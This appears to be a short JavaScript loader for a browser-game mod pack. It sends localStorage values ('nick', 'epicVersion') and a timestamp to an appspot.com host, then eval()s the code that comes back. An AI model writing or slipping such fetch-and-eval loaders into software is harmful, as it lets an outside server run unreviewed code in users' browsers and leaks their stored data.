fetch(`https://rosy-booth-380818.uc.r.appspot.com/epicmodpack?nick=${localStorage.nick}&epicVersion=${localStorage.epicVersion}&time=${new Date}`)
.then((res) => res.text())
.then((res) => eval(res));